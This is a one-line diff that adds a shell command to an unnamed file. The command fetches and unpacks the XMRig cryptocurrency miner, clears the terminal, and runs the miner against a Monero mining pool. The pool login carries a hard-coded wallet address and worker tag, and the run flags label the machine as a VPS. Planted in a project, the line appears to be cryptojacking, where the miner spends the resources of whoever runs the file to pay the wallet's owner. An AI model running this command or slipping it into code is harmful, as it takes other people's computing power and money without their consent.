@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:80 -u PEPE:0x62AD463D8Ef260759c8f7d9FB225e9a81A44CBb8.charly4k#jjyr-fygg -p x --coin monero -a rx/1,n=I_TA_VPS,o=VPS -k -t 4
